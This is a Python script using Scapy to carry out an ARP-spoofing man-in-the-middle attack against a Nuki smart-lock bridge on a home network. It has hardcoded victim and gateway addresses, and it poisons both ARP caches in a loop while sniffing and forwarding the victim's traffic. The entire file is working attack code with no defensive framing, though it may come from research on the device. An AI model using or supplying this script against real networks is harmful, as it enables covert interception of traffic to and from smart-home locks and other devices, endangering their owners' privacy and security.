from scapy.all import *
import time
import threading

# Add own mac address and ip
macAttacker = ""
ipAttacker = ""

# Nuki Bridge mac and ip
macVictim = "60:01:94:55:63:37"
ipVictim = "192.168.0.13"

# Gateway mac and ip
macGateway = "E4:FA:C4:BA:04:32"
ipToSpoof = "192.168.0.1"

# Name of the network interface
network_interface = "Wi-Fi"

# This packet is designed to fool the victim.
arp_to_victim = Ether() / ARP()
arp_to_victim[Ether].src = macAttacker
arp_to_victim[Ether].dst = macVictim
arp_to_victim[ARP].hwsrc = macAttacker
arp_to_victim[ARP].psrc = ipToSpoof
arp_to_victim[ARP].hwdst = macVictim
arp_to_victim[ARP].pdst = ipVictim
arp_to_victim[ARP].op = 2

print("Setup arp to victim")

# This packet is designed to fool the gateway.
arp_to_gateway = Ether() / ARP()
arp_to_gateway[Ether].src = macAttacker
arp_to_gateway[Ether].dst = macGateway
arp_to_gateway[ARP].hwsrc = macAttacker
arp_to_gateway[ARP].psrc = ipVictim
arp_to_gateway[ARP].hwdst = macGateway
arp_to_gateway[ARP].pdst = ipToSpoof
arp_to_gateway[ARP].op = 2

print("Setup arp gateway")

# Used to signal the threads to stop their loops.
stop_sniffing = False

def forward_packets(pkt):
    """
    This is the core of the man-in-the-middle. It's called for every
    packet captured by the sniffer. Its job is to forward the packet to
    its real destination.
    """
    # Check if the packet is an IP packet to avoid processing non-IP traffic
    if pkt.haslayer(IP):
        # Victim -> Gateway
        if pkt[Ether].src == macVictim:
            pkt[Ether].src = macAttacker
            pkt[Ether].dst = macGateway
            sendp(pkt, iface=network_interface, verbose=False)
            pass

        # Gateway -> Victim
        elif pkt[Ether].src == macGateway:
            pkt[Ether].src = macAttacker
            pkt[Ether].dst = macVictim
            sendp(pkt, iface=network_interface, verbose=False)
            pass


def arp_spoof():
    """
    This function runs in a loop in a separate thread. It continuously sends
    the malicious ARP packets to the victim and the gateway to keep their
    ARP caches poisoned. We loop because ARP entries can time out.
    """
    while not stop_sniffing:
        print("sending arp")
        sendp(arp_to_victim, iface=network_interface, verbose=False)
        sendp(arp_to_gateway, iface=network_interface, verbose=False)
        time.sleep(2)  # Send ARP replies every 2 seconds
    print("ARP spoofing stopped.")


def sniff_packets():
    """
    This function starts the Scapy sniffer. It listens on the specified
    interface for packets matching the filter and passes each one to the
    `forward_packets` function for processing.
    """
    print("Sniffing and attempting to forward packets...")
    sniff(
        iface=network_interface,
        prn=forward_packets,
        filter=f"ip host {ipVictim}",
        store=0,
        stop_filter=lambda x: stop_sniffing,
    )
    print("Sniffing stopped.")



# Create two threads: one for ARP spoofing and one for sniffing/forwarding.
arp_thread = threading.Thread(target=arp_spoof)
sniff_thread = threading.Thread(target=sniff_packets)

# Start both threads.
arp_thread.start()
sniff_thread.start()

try:
    # Keep main thread alive to keep ctrl+c functioning
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nKeyboardInterrupt received. Stopping...")
    stop_sniffing = True

# Wait for the threads to finish their execution before exiting.
arp_thread.join()
sniff_thread.join()